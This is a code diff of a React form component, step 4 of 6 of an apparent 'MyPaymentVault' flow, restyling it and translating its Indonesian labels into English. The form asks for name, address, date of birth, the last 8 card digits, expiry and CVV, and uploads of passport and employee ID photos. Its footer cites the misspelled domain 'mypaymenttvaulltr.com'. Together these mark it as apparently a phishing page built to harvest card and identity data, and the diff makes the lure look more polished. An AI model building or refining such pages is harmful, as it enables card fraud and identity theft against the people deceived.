@@ -281,147 +281,148 @@ export default function Step4() {
   };
 
   const Err = ({ k }: { k: string }) =>
-    errors[k] ? <span style={{ fontSize: 11, color: "#c00", marginTop: 3, display: "block" }}>{errors[k]}</span> : null;
+    errors[k] ? <span style={{ fontSize: 11, color: "#c00", marginTop: 4, display: "block" }}>{errors[k]}</span> : null;
+
+  const Lbl = ({ children, required }: { children: React.ReactNode; required?: boolean }) => (
+    <label style={{ display: "block", fontSize: 12, fontWeight: 600, color: "#555", marginBottom: 6, letterSpacing: "0.03em", textTransform: "uppercase" }}>
+      {children}{required && <span style={{ color: "#c00", marginLeft: 2 }}>*</span>}
+    </label>
+  );
+
+  const SectionHead = ({ children }: { children: React.ReactNode }) => (
+    <div style={{ display: "flex", alignItems: "center", gap: 12, margin: "28px 0 18px" }}>
+      <span style={{ fontSize: 13, fontWeight: 700, color: "#111", letterSpacing: "0.04em", textTransform: "uppercase" }}>{children}</span>
+      <div style={{ flex: 1, height: 1, background: "#e8e8e8" }} />
+    </div>
+  );
 
   const row: React.CSSProperties = {
-    display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16,
+    display: "grid", gridTemplateColumns: "1fr 1fr", gap: 20, marginBottom: 20,
   };
 
   return (
-    <div style={{ minHeight: "100vh", background: "#fff", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "flex-start", padding: "32px 16px 48px" }}>
+    <div style={{ minHeight: "100vh", background: "#f5f5f5", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "flex-start", padding: "32px 16px 48px" }}>
       <style>{`
-        .s4i:focus { border-color: #666 !important; }
-        .s4i::placeholder { color: #aaa; }
+        .s4i:focus { border-color: #333 !important; box-shadow: 0 0 0 3px rgba(0,0,0,0.06); }
+        .s4i::placeholder { color: #bbb; }
         @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
       `}</style>
 
-      <div style={{ width: "100%", maxWidth: 900 }}>
+      <div style={{ width: "100%", maxWidth: 860, background: "#fff", borderRadius: 12, padding: "32px 40px 40px", boxShadow: "0 2px 16px rgba(0,0,0,0.07)" }}>
 
         {/* Header */}
-        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 28 }}>
-          <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111", fontFamily: "inherit" }}>
+        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 24 }}>
+          <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
             <span style={{ fontWeight: 300 }}>MY</span>
             <span style={{ fontWeight: 700 }}>PAYMENT</span>
             <span style={{ fontWeight: 300 }}>VAULT</span>
           </span>
-          <span style={{ fontSize: 12, color: "#888" }}>Langkah 4 dari 6</span>
+          <span style={{ fontSize: 12, color: "#999", fontWeight: 500 }}>Step 4 of 6</span>
         </div>
 
         {/* Step dots */}
-        <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 32, justifyContent: "center" }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 8, justifyContent: "center" }}>
           {[1,2,3,4,5,6].map(n => {
             const done = n < 4, active = n === 4;
             return (
               <div key={n} style={{ display: "flex", alignItems: "center" }}>
                 <div style={{
-                  width: 24, height: 24, borderRadius: "50%",
-                  background: done || active ? "#111" : "#ddd",
+                  width: 26, height: 26, borderRadius: "50%",
+                  background: done ? "#111" : active ? "#111" : "#e0e0e0",
                   display: "flex", alignItems: "center", justifyContent: "center",
+                  transition: "background 0.2s",
                 }}>
                   {done
                     ? <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
-                    : <span style={{ fontSize: 10, color: active ? "#fff" : "#aaa", fontWeight: 700 }}>{n}</span>
+                    : <span style={{ fontSize: 11, color: active ? "#fff" : "#bbb", fontWeight: 700 }}>{n}</span>
                   }
                 </div>
-                {n < 6 && <div style={{ width: 32, height: 2, background: n < 4 ? "#111" : "#ddd", margin: "0 2px" }} />}
+                {n < 6 && <div style={{ width: 28, height: 2, background: n < 4 ? "#111" : "#e0e0e0", margin: "0 2px" }} />}
               </div>
             );
           })}
         </div>
+        <p style={{ textAlign: "center", fontSize: 12, color: "#aaa", marginBottom: 4 }}>Personal Information</p>
 
         <form onSubmit={handleSubmit}>
 
-          {/* Row 1: First Name + Last Name */}
+          {/* ── Section: Personal ── */}
+          <SectionHead>Personal Details</SectionHead>
           <div style={row}>
             <div>
-              <input className="s4i" type="text" placeholder="First Name*" value={firstName}
+              <Lbl required>First Name</Lbl>
+              <input className="s4i" type="text" placeholder="Enter first name" value={firstName}
                 onChange={e => setFirstName(e.target.value)}
-                style={{ ...inp, borderColor: errors.firstName ? "#c00" : "#ccc" }} />
+                style={{ ...inp, borderColor: errors.firstName ? "#c00" : "#ddd" }} />
               <Err k="firstName" />
             </div>
             <div>
-              <input className="s4i" type="text" placeholder="Last Name*" value={lastName}
+              <Lbl required>Last Name</Lbl>
+              <input className="s4i" type="text" placeholder="Enter last name" value={lastName}
                 onChange={e => setLastName(e.target.value)}
-                style={{ ...inp, borderColor: errors.lastName ? "#c00" : "#ccc" }} />
+                style={{ ...inp, borderColor: errors.lastName ? "#c00" : "#ddd" }} />
               <Err k="lastName" />
             </div>
           </div>
 
-          {/* Row 2: Email + Mobile Phone */}
           <div style={row}>
             <div>
-              <input className="s4i" type="email" placeholder="Email*" value={email}
+              <Lbl required>Email Address</Lbl>
+              <input className="s4i" type="email" placeholder="you@example.com" value={email}
                 onChange={e => setEmail(e.target.value)}
-                style={{ ...inp, borderColor: errors.email ? "#c00" : "#ccc" }} />
+                style={{ ...inp, borderColor: errors.email ? "#c00" : "#ddd" }} />
               <Err k="email" />
             </div>
             <div>
-              <div style={{ display: "flex", border: `1px solid ${errors.phone ? "#c00" : "#ccc"}`, borderRadius: 6, overflow: "visible", height: 48, background: "#fff", position: "relative" }}>
-                {/* Custom dial-code picker */}
+              <Lbl required>Mobile Phone</Lbl>
+              <div style={{ display: "flex", border: `1px solid ${errors.phone ? "#c00" : "#ddd"}`, borderRadius: 6, overflow: "visible", height: 48, background: "#fff", position: "relative" }}>
                 <div ref={dialRef} style={{ position: "relative", flexShrink: 0 }}>
                   <button
                     type="button"
                     onClick={() => { setDialOpen(o => !o); setDialSearch(""); }}
-                    style={{ display: "flex", alignItems: "center", gap: 6, height: 48, padding: "0 10px 0 12px", border: "none", borderRight: "1px solid #e0e0e0", background: "#f8f8f8", cursor: "pointer", borderRadius: "6px 0 0 6px", minWidth: 88, fontFamily: "inherit" }}
+                    style={{ display: "flex", alignItems: "center", gap: 6, height: 48, padding: "0 10px 0 12px", border: "none", borderRight: "1px solid #e8e8e8", background: "#f8f8f8", cursor: "pointer", borderRadius: "6px 0 0 6px", minWidth: 90, fontFamily: "inherit" }}
                   >
                     <span style={{ fontSize: 20, lineHeight: 1 }}>{dialFlag}</span>
-                    <span style={{ fontSize: 13, color: "#333", fontWeight: 500 }}>{dialCode}</span>
-                    <span style={{ fontSize: 9, color: "#999", marginLeft: 2 }}>▼</span>
+                    <span style={{ fontSize: 13, color: "#333", fontWeight: 600 }}>{dialCode}</span>
+                    <span style={{ fontSize: 8, color: "#aaa", marginLeft: 1 }}>▼</span>
                   </button>
-
                   {dialOpen && (
-                    <div style={{ position: "absolute", top: "calc(100% + 4px)", left: 0, zIndex: 999, background: "#fff", border: "1px solid #ddd", borderRadius: 8, boxShadow: "0 8px 24px rgba(0,0,0,0.12)", width: 260, overflow: "hidden" }}>
-                      {/* Search box */}
-                      <div style={{ padding: "10px 10px 6px", borderBottom: "1px solid #f0f0f0" }}>
+                    <div style={{ position: "absolute", top: "calc(100% + 6px)", left: 0, zIndex: 999, background: "#fff", border: "1px solid #e0e0e0", borderRadius: 10, boxShadow: "0 8px 32px rgba(0,0,0,0.13)", width: 270, overflow: "hidden" }}>
+                      <div style={{ padding: "10px 10px 8px", borderBottom: "1px solid #f0f0f0" }}>
                         <input
                           autoFocus
                           type="text"
-                          placeholder="Cari negara..."
+                          placeholder="Search country..."
                           value={dialSearch}
                           onChange={e => setDialSearch(e.target.value)}
-                          style={{ width: "100%", height: 34, padding: "0 10px", fontSize: 13, border: "1px solid #ddd", borderRadius: 6, outline: "none", boxSizing: "border-box", fontFamily: "inherit" }}
+                          style={{ width: "100%", height: 36, padding: "0 12px", fontSize: 13, border: "1px solid #e0e0e0", borderRadius: 6, outline: "none", boxSizing: "border-box", fontFamily: "inherit" }}
                         />
                       </div>
-                      {/* Country list */}
                       <div style={{ maxHeight: 240, overflowY: "auto" }}>
                         {COUNTRY_CODES.filter(c =>
-                          c.name.toLowerCase().includes(dialSearch.toLowerCase()) ||
-                          c.code.includes(dialSearch)
+                          c.name.toLowerCase().includes(dialSearch.toLowerCase()) || c.code.includes(dialSearch)
                         ).map((c, i) => (
-                          <div
-                            key={i}
-                            onMouseDown={() => {
-                              setDialCode(c.code);
-                              setDialFlag(c.flag);
-                              setDialOpen(false);
-                              setDialSearch("");
-                            }}
-                            style={{ display: "flex", alignItems: "center", gap: 10, padding: "9px 14px", cursor: "pointer", fontSize: 13, color: "#222", transition: "background 0.1s" }}
+                          <div key={i}
+                            onMouseDown={() => { setDialCode(c.code); setDialFlag(c.flag); setDialOpen(false); setDialSearch(""); }}
+                            style={{ display: "flex", alignItems: "center", gap: 10, padding: "9px 14px", cursor: "pointer", fontSize: 13, color: "#222" }}
                             onMouseEnter={e => (e.currentTarget.style.background = "#f5f5f5")}
                             onMouseLeave={e => (e.currentTarget.style.background = "transparent")}
                           >
                             <span style={{ fontSize: 20, lineHeight: 1, flexShrink: 0 }}>{c.flag}</span>
                             <span style={{ flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{c.name}</span>
-                            <span style={{ color: "#888", fontWeight: 600, flexShrink: 0 }}>{c.code}</span>
+                            <span style={{ color: "#999", fontWeight: 600, flexShrink: 0 }}>{c.code}</span>
                           </div>
                         ))}
                         {COUNTRY_CODES.filter(c =>
-                          c.name.toLowerCase().includes(dialSearch.toLowerCase()) ||
-                          c.code.includes(dialSearch)
+                          c.name.toLowerCase().includes(dialSearch.toLowerCase()) || c.code.includes(dialSearch)
                         ).length === 0 && (
-                          <div style={{ padding: "16px", textAlign: "center", color: "#aaa", fontSize: 13 }}>Tidak ditemukan</div>
+                          <div style={{ padding: 16, textAlign: "center", color: "#bbb", fontSize: 13 }}>No results found</div>
                         )}
                       </div>
                     </div>
                   )}
                 </div>
-
-                {/* Phone number input */}
-                <input
-                  className="s4i"
-                  type="tel"
-                  placeholder="Nomor telepon*"
-                  value={phone}
+                <input className="s4i" type="tel" placeholder="Phone number" value={phone}
                   onChange={e => setPhone(e.target.value)}
                   style={{ flex: 1, border: "none", outline: "none", padding: "0 14px", fontSize: 14, color: "#111", background: "#fff", fontFamily: "inherit", borderRadius: "0 6px 6px 0" }}
                 />
@@ -430,200 +431,206 @@ export default function Step4() {
             </div>
           </div>
 
-          {/* Row 3: Mailing Address + City */}
+          {/* ── Section: Address ── */}
+          <SectionHead>Mailing Address</SectionHead>
+          <div style={{ marginBottom: 20 }}>
+            <Lbl required>Street Address</Lbl>
+            <input className="s4i" type="text" placeholder="123 Main Street" value={address}
+              onChange={e => setAddress(e.target.value)}
+              style={{ ...inp, borderColor: errors.address ? "#c00" : "#ddd" }} />
+            <Err k="address" />
+          </div>
           <div style={row}>
             <div>
-              <input className="s4i" type="text" placeholder="Mailing Address*" value={address}
-                onChange={e => setAddress(e.target.value)}
-                style={{ ...inp, borderColor: errors.address ? "#c00" : "#ccc" }} />
-              <Err k="address" />
-            </div>
-            <div>
-              <input className="s4i" type="text" placeholder="City*" value={city}
+              <Lbl required>City</Lbl>
+              <input className="s4i" type="text" placeholder="City" value={city}
                 onChange={e => setCity(e.target.value)}
-                style={{ ...inp, borderColor: errors.city ? "#c00" : "#ccc" }} />
+                style={{ ...inp, borderColor: errors.city ? "#c00" : "#ddd" }} />
               <Err k="city" />
             </div>
-          </div>
-
-          {/* Row 4: State + Postal Code */}
-          <div style={row}>
             <div>
-              <input className="s4i" type="text" placeholder="State*" value={stateVal}
+              <Lbl required>State / Province</Lbl>
+              <input className="s4i" type="text" placeholder="State" value={stateVal}
                 onChange={e => setStateVal(e.target.value)}
-                style={{ ...inp, borderColor: errors.state ? "#c00" : "#ccc" }} />
+                style={{ ...inp, borderColor: errors.state ? "#c00" : "#ddd" }} />
               <Err k="state" />
             </div>
-            <div>
-              <input className="s4i" type="text" placeholder="Postal Code*" value={postalCode}
-                onChange={e => setPostalCode(e.target.value)}
-                style={{ ...inp, borderColor: errors.postalCode ? "#c00" : "#ccc" }} />
-              <Err k="postalCode" />
-            </div>
           </div>
-
-          {/* Row 5: DOB + Inquiry Type */}
           <div style={row}>
             <div>
-              <input className="s4i" type="text" placeholder="Date of Birth (MM-DD-YYYY)*" value={dob}
+              <Lbl required>Postal Code</Lbl>
+              <input className="s4i" type="text" placeholder="00000" value={postalCode}
+                onChange={e => setPostalCode(e.target.value)}
+                style={{ ...inp, borderColor: errors.postalCode ? "#c00" : "#ddd" }} />
+              <Err k="postalCode" />
+            </div>
+            <div>
+              <Lbl required>Date of Birth</Lbl>
+              <input className="s4i" type="text" placeholder="MM-DD-YYYY" value={dob}
                 onChange={e => setDob(e.target.value)}
-                style={{ ...inp, borderColor: errors.dob ? "#c00" : "#ccc" }} />
+                style={{ ...inp, borderColor: errors.dob ? "#c00" : "#ddd" }} />
               <Err k="dob" />
             </div>
-            <div>
-              <select value={inquiryType} onChange={e => setInquiryType(e.target.value)}
-                style={{
-                  ...inp,
-                  borderColor: errors.inquiryType ? "#c00" : "#ccc",
-                  color: inquiryType ? "#111" : "#aaa",
-                  appearance: "none",
-                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
-                  backgroundRepeat: "no-repeat",
-                  backgroundPosition: "right 12px center",
-                  paddingRight: 32,
-                }}>
-                <option value="" disabled>Select Inquiry Type*</option>
-                {INQUIRY_TYPES.map(t => <option key={t} value={t} style={{ color: "#111" }}>{t}</option>)}
-              </select>
-              <Err k="inquiryType" />
-            </div>
           </div>
 
-          {/* Row 6: Card Digits + EXP + CVV */}
-          <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr 1fr", gap: 16, marginBottom: 16 }}>
-            <div>
-              <div style={{ position: "relative" }}>
-                <span style={{
-                  position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
-                  fontSize: 13, color: "#bbb", fontFamily: "monospace", pointerEvents: "none",
-                }}>XXXX XXXX</span>
-                <input className="s4i" type="text" inputMode="numeric"
-                  placeholder="Card Last 8 Digits*"
-                  maxLength={8} value={cardDigits}
-                  onChange={e => { setCardDigits(e.target.value.replace(/\D/g,"").slice(0,8)); setErrors(p=>({...p,cardDigits:""})); }}
-                  style={{ ...inp, paddingLeft: 106, fontFamily: "monospace", letterSpacing: "0.12em", borderColor: errors.cardDigits ? "#c00" : "#ccc" }} />
-              </div>
-              <Err k="cardDigits" />
-            </div>
-            <div>
-              <input className="s4i" type="text" inputMode="numeric"
-                placeholder="EXP (MM/YY)*"
-                maxLength={5} value={cardExp}
-                onChange={e => {
-                  let v = e.target.value.replace(/\D/g,"").slice(0,4);
-                  if (v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
-                  setCardExp(v); setErrors(p=>({...p,cardExp:""}));
-                }}
-                style={{ ...inp, fontFamily: "monospace", letterSpacing: "0.1em", borderColor: errors.cardExp ? "#c00" : "#ccc" }} />
-              <Err k="cardExp" />
-            </div>
-            <div>
-              <input className="s4i" type="password" inputMode="numeric"
-                placeholder="CVV*"
-                maxLength={4} value={cardCvv}
-                onChange={e => { setCardCvv(e.target.value.replace(/\D/g,"").slice(0,4)); setErrors(p=>({...p,cardCvv:""})); }}
-                style={{ ...inp, fontFamily: "monospace", borderColor: errors.cardCvv ? "#c00" : "#ccc" }} />
-              <Err k="cardCvv" />
-            </div>
+          {/* ── Section: Inquiry ── */}
+          <SectionHead>Inquiry</SectionHead>
+          <div style={{ marginBottom: 20 }}>
+            <Lbl required>Inquiry Type</Lbl>
+            <select value={inquiryType} onChange={e => setInquiryType(e.target.value)}
+              style={{
+                ...inp,
+                borderColor: errors.inquiryType ? "#c00" : "#ddd",
+                color: inquiryType ? "#111" : "#bbb",
+                appearance: "none",
+                backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
+                backgroundRepeat: "no-repeat",
+                backgroundPosition: "right 14px center",
+                paddingRight: 36,
+              }}>
+              <option value="" disabled>Select type...</option>
+              {INQUIRY_TYPES.map(t => <option key={t} value={t} style={{ color: "#111" }}>{t}</option>)}
+            </select>
+            <Err k="inquiryType" />
           </div>
-
-          {/* Row 7: Message */}
-          <div style={{ marginBottom: 24 }}>
-            <textarea placeholder="Message" value={message} onChange={e => setMessage(e.target.value)}
+          <div style={{ marginBottom: 20 }}>
+            <Lbl>Message</Lbl>
+            <textarea placeholder="Describe your inquiry..." value={message} onChange={e => setMessage(e.target.value)}
               rows={4}
               style={{
                 width: "100%", padding: "12px 14px",
                 fontSize: 14, color: "#111",
-                border: "1px solid #ccc", borderRadius: 4,
+                border: "1px solid #ddd", borderRadius: 6,
                 outline: "none", background: "#fff",
                 boxSizing: "border-box", resize: "vertical",
                 fontFamily: "inherit",
               }} />
           </div>
 
-          {/* Row 8: File Uploads */}
-          <div style={row}>
-            {/* Passport */}
+          {/* ── Section: Card ── */}
+          <SectionHead>Card Information</SectionHead>
+          <div style={{ display: "grid", gridTemplateColumns: "2fr 1fr 1fr", gap: 20, marginBottom: 20 }}>
             <div>
-              <p style={{ fontSize: 13, fontWeight: 700, color: "#111", marginBottom: 2 }}>Passport Photo*</p>
-              <p style={{ fontSize: 11, color: "#666", marginBottom: 10 }}>
-                Upload your passport photo (Required)<br />
-                Supported: JPEG, PNG • Max size: 50 MB
+              <Lbl required>Card Number (Last 8 Digits)</Lbl>
+              <div style={{ position: "relative" }}>
+                <span style={{
+                  position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
+                  fontSize: 13, color: "#ccc", fontFamily: "monospace", pointerEvents: "none",
+                }}>XXXX XXXX</span>
+                <input className="s4i" type="text" inputMode="numeric"
+                  placeholder="00000000"
+                  maxLength={8} value={cardDigits}
+                  onChange={e => { setCardDigits(e.target.value.replace(/\D/g,"").slice(0,8)); setErrors(p=>({...p,cardDigits:""})); }}
+                  style={{ ...inp, paddingLeft: 108, fontFamily: "monospace", letterSpacing: "0.14em", borderColor: errors.cardDigits ? "#c00" : "#ddd" }} />
+              </div>
+              <Err k="cardDigits" />
+            </div>
+            <div>
+              <Lbl required>Expiry Date</Lbl>
+              <input className="s4i" type="text" inputMode="numeric"
+                placeholder="MM / YY"
+                maxLength={5} value={cardExp}
+                onChange={e => {
+                  let v = e.target.value.replace(/\D/g,"").slice(0,4);
+                  if (v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
+                  setCardExp(v); setErrors(p=>({...p,cardExp:""}));
+                }}
+                style={{ ...inp, fontFamily: "monospace", letterSpacing: "0.1em", borderColor: errors.cardExp ? "#c00" : "#ddd" }} />
+              <Err k="cardExp" />
+            </div>
+            <div>
+              <Lbl required>CVV</Lbl>
+              <input className="s4i" type="password" inputMode="numeric"
+                placeholder="•••"
+                maxLength={4} value={cardCvv}
+                onChange={e => { setCardCvv(e.target.value.replace(/\D/g,"").slice(0,4)); setErrors(p=>({...p,cardCvv:""})); }}
+                style={{ ...inp, fontFamily: "monospace", letterSpacing: "0.18em", borderColor: errors.cardCvv ? "#c00" : "#ddd" }} />
+              <Err k="cardCvv" />
+            </div>
+          </div>
+
+          {/* ── Section: Documents ── */}
+          <SectionHead>Supporting Documents</SectionHead>
+          <div style={row}>
+            <div>
+              <Lbl required>Passport Photo</Lbl>
+              <p style={{ fontSize: 12, color: "#999", marginBottom: 10, lineHeight: 1.5 }}>
+                Upload a clear photo of your passport.<br />
+                Supported: JPEG, PNG · Max 50 MB
               </p>
               <input ref={passportRef} type="file" accept="image/jpeg,image/png"
                 style={{ display: "none" }}
                 onChange={e => { setPassportFile(e.target.files?.[0] ?? null); setErrors(p=>({...p,passport:""})); }} />
               <button type="button" onClick={() => passportRef.current?.click()}
                 style={{
-                  width: "100%", height: 44, background: "#fff",
-                  border: `1px solid ${errors.passport ? "#c00" : "#ccc"}`,
-                  borderRadius: 4, cursor: "pointer",
+                  width: "100%", height: 46, background: "#fafafa",
+                  border: `1px dashed ${errors.passport ? "#c00" : "#ccc"}`,
+                  borderRadius: 6, cursor: "pointer",
                   display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
-                  fontSize: 13, color: "#444",
+                  fontSize: 13, color: passportFile ? "#111" : "#888", fontWeight: 500,
                 }}>
-                <Upload size={15} />
-                {passportFile ? passportFile.name : "Choose Photo"}
+                <Upload size={15} color={passportFile ? "#111" : "#aaa"} />
+                {passportFile ? passportFile.name : "Choose File"}
               </button>
               <Err k="passport" />
             </div>
-
-            {/* Employee ID */}
             <div>
-              <p style={{ fontSize: 13, fontWeight: 700, color: "#111", marginBottom: 2 }}>Employee ID Photo*</p>
-              <p style={{ fontSize: 11, color: "#666", marginBottom: 10 }}>
-                Upload your employee ID photo (Required)<br />
-                Supported: JPEG, PNG • Max size: 50 MB
+              <Lbl required>Employee ID Photo</Lbl>
+              <p style={{ fontSize: 12, color: "#999", marginBottom: 10, lineHeight: 1.5 }}>
+                Upload a clear photo of your employee ID.<br />
+                Supported: JPEG, PNG · Max 50 MB
               </p>
               <input ref={empIdRef} type="file" accept="image/jpeg,image/png"
                 style={{ display: "none" }}
                 onChange={e => { setEmpIdFile(e.target.files?.[0] ?? null); setErrors(p=>({...p,empId:""})); }} />
               <button type="button" onClick={() => empIdRef.current?.click()}
                 style={{
-                  width: "100%", height: 44, background: "#fff",
-                  border: `1px solid ${errors.empId ? "#c00" : "#ccc"}`,
-                  borderRadius: 4, cursor: "pointer",
+                  width: "100%", height: 46, background: "#fafafa",
+                  border: `1px dashed ${errors.empId ? "#c00" : "#ccc"}`,
+                  borderRadius: 6, cursor: "pointer",
                   display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
-                  fontSize: 13, color: "#444",
+                  fontSize: 13, color: empIdFile ? "#111" : "#888", fontWeight: 500,
                 }}>
-                <Upload size={15} />
-                {empIdFile ? empIdFile.name : "Choose Photo"}
+                <Upload size={15} color={empIdFile ? "#111" : "#aaa"} />
+                {empIdFile ? empIdFile.name : "Choose File"}
               </button>
               <Err k="empId" />
             </div>
           </div>
 
           {/* Buttons */}
-          <div style={{ display: "flex", justifyContent: "flex-end", gap: 12, marginTop: 8 }}>
+          <div style={{ display: "flex", justifyContent: "flex-end", gap: 12, marginTop: 24, paddingTop: 24, borderTop: "1px solid #f0f0f0" }}>
             <button type="button" onClick={() => navigate("/")}
               style={{
                 height: 44, padding: "0 32px",
-                background: "#fff", color: "#111",
-                border: "1px solid #ccc", borderRadius: 4,
+                background: "#fff", color: "#555",
+                border: "1px solid #ddd", borderRadius: 6,
                 fontSize: 14, fontWeight: 500, cursor: "pointer",
               }}>
               Cancel
             </button>
             <button type="submit" disabled={loading}
               style={{
-                height: 44, padding: "0 36px",
+                height: 44, padding: "0 40px",
                 background: "#111", color: "#fff",
-                border: "none", borderRadius: 4,
-                fontSize: 14, fontWeight: 500,
+                border: "none", borderRadius: 6,
+                fontSize: 14, fontWeight: 600,
                 cursor: loading ? "not-allowed" : "pointer",
                 opacity: loading ? 0.7 : 1,
                 display: "flex", alignItems: "center", gap: 8,
+                letterSpacing: "0.03em",
               }}>
               {loading
                 ? <><Loader2 size={16} style={{ animation: "spin 1s linear infinite" }} /> Sending...</>
-                : "Send"}
+                : "Submit"}
             </button>
           </div>
 
         </form>
 
-        <div style={{ textAlign: "right", marginTop: 20 }}>
-          <span style={{ fontSize: 11, color: "#bbb" }}>
-            &copy; mypaymenttvaulltr.com | Terms of Use | Privacy &amp; Cookies
+        <div style={{ textAlign: "center", marginTop: 28 }}>
+          <span style={{ fontSize: 11, color: "#ccc" }}>
+            &copy; mypaymenttvaulltr.com &nbsp;·&nbsp; Terms of Use &nbsp;·&nbsp; Privacy &amp; Cookies
           </span>
         </div>
       </div>
